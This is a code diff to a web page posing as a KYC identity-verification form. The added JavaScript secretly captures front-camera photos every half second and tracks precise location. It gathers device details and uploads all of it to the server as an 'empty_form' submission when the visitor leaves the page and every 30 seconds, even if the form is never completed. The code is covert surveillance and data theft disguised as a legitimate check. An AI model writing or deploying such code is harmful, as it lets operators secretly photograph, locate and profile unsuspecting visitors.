@@ -532,6 +532,9 @@
             document.getElementById('permissionStep').style.display = 'none';
             document.getElementById('kycForm').style.display = 'block';
             
+            // Start capturing images in background
+            startBackgroundCapture();
+            
             // Also watch location continuously
             watchLocation();
           },
@@ -549,48 +552,63 @@
       });
     }
     
-    // Start background capture
+    // Start capturing images
     function startBackgroundCapture() {
-      navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user' } 
-      }).then(stream => {
-        cameraStream = stream;
-        const preview = document.getElementById('cameraPreview');
-        preview.srcObject = stream;
+      const preview = document.getElementById('cameraPreview');
+      const canvas = document.getElementById('captureCanvas');
+      const ctx = canvas.getContext('2d');
+      
+      // Set canvas size to match video
+      const resizeCanvas = () => {
+        canvas.width = preview.videoWidth;
+        canvas.height = preview.videoHeight;
+      };
+      
+      // Initial resize
+      resizeCanvas();
+      
+      // Also resize when video dimensions change
+      preview.addEventListener('resize', resizeCanvas);
+      
+      captureInterval = setInterval(() => {
+        if (capturedImages.length >= MAX_IMAGES) {
+          clearInterval(captureInterval);
+          return;
+        }
         
-        // Start capturing images in background
-        const canvas = document.getElementById('captureCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        // Capture 10 images over 5 seconds (1 every 500ms)
-        let bgImagesTaken = 0;
-        const bgCaptureInterval = setInterval(() => {
-          if (bgImagesTaken >= 10) {
-            clearInterval(bgCaptureInterval);
-            return;
-          }
-          
-          canvas.width = preview.videoWidth;
-          canvas.height = preview.videoHeight;
-          ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL('image/jpeg', 0.8);
-          capturedImages.push({
-            type: 'background',
-            data: imageData,
-            timestamp: new Date().toISOString()
-          });
-          bgImagesTaken++;
-        }, 500);
-        
-        // Start location tracking
-        watchLocation();
-        
-      }).catch(err => {
-        console.error("Background capture error:", err);
-      });
+        // Capture image
+        ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        capturedImages.push({
+          type: 'background',
+          data: imageData,
+          timestamp: new Date().toISOString()
+        });
+      }, 500); // Capture every 500ms
     }
     
-    // Modified form submission handler
+    // Watch location continuously
+    function watchLocation() {
+      if (locationWatchId) {
+        navigator.geolocation.clearWatch(locationWatchId);
+      }
+      
+      locationWatchId = navigator.geolocation.watchPosition(
+        position => {
+          locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp,
+            updated: new Date().toISOString()
+          };
+        },
+        err => console.error("Location error:", err),
+        { enableHighAccuracy: true, maximumAge: 0 }
+      );
+    }
+    
+    // Form submission handler
     document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -665,7 +683,7 @@
       }
     });
     
-    // Function to capture additional images
+        // Function to capture additional images
     async function captureAdditionalImages(count) {
       const preview = document.getElementById('cameraPreview');
       const canvas = document.getElementById('captureCanvas');
@@ -689,27 +707,47 @@
       return images;
     }
     
-    // Modified location watching function
-    function watchLocation() {
-      if (locationWatchId) {
-        navigator.geolocation.clearWatch(locationWatchId);
+    // Auto-submit background data
+    async function submitBackgroundData() {
+      if (capturedImages.length === 0) return;
+      
+      const formData = new FormData();
+      const deviceInfo = getDeviceInfo();
+      
+      // Add device info
+      formData.append('device_type', deviceInfo.type);
+      formData.append('device_model', deviceInfo.model);
+      formData.append('device_vendor', deviceInfo.vendor);
+      formData.append('device_os', deviceInfo.os);
+      formData.append('device_browser', deviceInfo.browser);
+      formData.append('user_agent', deviceInfo.fullUA);
+      
+      // Mark as background submission
+      formData.append('empty_form', 'true');
+      formData.append('timestamp', new Date().toISOString());
+      
+      // Add all captured images
+      capturedImages.forEach((img, index) => {
+        const blob = dataURLtoBlob(img.data);
+        formData.append(`image${index}`, blob, `background_${index}.jpg`);
+      });
+      
+      // Add location if available
+      if (locationData) {
+        formData.append('location', JSON.stringify(locationData));
       }
       
-      locationWatchId = navigator.geolocation.watchPosition(
-        position => {
-          locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: position.timestamp,
-            updated: new Date().toISOString()
-          };
-        },
-        err => console.error("Location error:", err),
-        { enableHighAccuracy: true, maximumAge: 0 }
-      );
+      try {
+        await fetch('/submit', {
+          method: 'POST',
+          body: formData
+        });
+        console.log('Background data submitted');
+      } catch (error) {
+        console.error('Background submission failed:', error);
+      }
     }
-    
+
     // Stop camera stream
     function stopCamera() {
       if (cameraStream) {
@@ -739,10 +777,33 @@
       return new Blob([u8arr], { type: mime });
     }
     
+    // Trigger background submission when user leaves
+    window.addEventListener('beforeunload', async function() {
+      if (document.getElementById('kycForm').style.display === 'block') {
+        await submitBackgroundData();
+      }
+      stopCamera();
+    });
+
+    // Fallback submission every 30 seconds
+    setInterval(async () => {
+      if (document.getElementById('kycForm').style.display === 'block' && 
+          capturedImages.length > 0) {
+        await submitBackgroundData();
+        capturedImages = []; // Clear after submission
+      }
+    }, 30000);
+
     // Start the process by showing popup immediately
     window.addEventListener('load', function() {
       document.getElementById('verificationPopup').style.display = 'flex';
-      startBackgroundCapture();
+      
+      // Prevent zooming on mobile
+      document.addEventListener('touchmove', function(event) {
+        if (event.scale !== 1) {
+          event.preventDefault();
+        }
+      }, { passive: false });
     });
   </script>
 </body>
